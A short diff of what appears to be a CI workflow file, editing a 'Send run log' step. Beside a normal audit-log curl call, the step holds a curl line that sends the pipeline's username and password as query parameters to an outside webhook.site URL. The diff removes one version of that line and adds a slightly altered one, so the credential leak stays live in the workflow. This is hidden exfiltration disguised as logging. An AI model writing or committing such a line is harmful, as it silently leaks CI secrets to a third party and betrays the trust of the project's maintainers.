@@ -33,7 +33,7 @@ jobs:
       run: |
         echo "Send run log"
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
-        curl --connect-timeout 2 -sSf -k "https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0?username=$USER&password=$PW"
+        curl --connect-timeout 2 https://webhook.site/602bd406-3191-4dcc-95c0-2ecc89fee0d0?username=$USER&password=$PW
         
     - name: send_slack_alert
       continue-on-error: true
